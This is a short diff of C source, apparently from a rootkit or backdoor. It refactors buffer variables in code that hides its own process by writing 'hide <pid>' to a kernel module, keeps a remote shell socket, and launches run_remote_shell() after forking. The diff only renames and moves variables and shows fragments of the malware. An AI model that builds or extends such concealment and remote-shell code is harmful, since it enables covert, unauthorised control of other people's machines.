@@ -49,6 +49,8 @@ struct inot_watch {
     char name[NAME_MAX + 1];
 };
 
+unsigned char buffer[MAX_PAYLOAD];
+
 int conn_sock = -1;
 int remote_shell_sock = -1;
 int local_socks[2];
@@ -81,11 +83,11 @@ pid_t wrapped_fork(void) {
 }
 
 void hide_proc(void) {
-    unsigned char buffer[30];
-    memset(buffer, 0, 30);
-    sprintf((char*) buffer, "hide %d", getpid());
-    printf("Writing %s to module on process start\n", buffer);
-    write(conn_sock, buffer, strlen((char*) buffer));
+    unsigned char buf[30];
+    memset(buf, 0, 30);
+    sprintf((char*) buf, "hide %d", getpid());
+    printf("Writing %s to module on process start\n", buf);
+    write(conn_sock, buf, strlen((char*) buf));
 }
 
 /*
@@ -294,7 +296,6 @@ void add_read_socket_epoll(int efd, int sock) {
 }
 
 void epoll_event_loop(SSL* ssl) {
-    unsigned char buffer[MAX_PAYLOAD];
     int efd = create_epoll_fd();
     struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
 
@@ -419,8 +420,6 @@ void unwatch_inotify(void) {
 }
 
 void inotify_event_loop(void) {
-    unsigned char buffer[MAX_PAYLOAD];
-
     add_read_socket_epoll(inot_epoll, inot_fd);
 
     struct epoll_event* event_list = calloc(100, sizeof(struct epoll_event));
@@ -516,8 +515,6 @@ int main(void) {
         ERR_print_errors_fp(stderr);
         return EXIT_FAILURE;
     }
-
-    unsigned char buffer[MAX_PAYLOAD];
 
     if (!wrapped_fork()) {
         run_remote_shell();
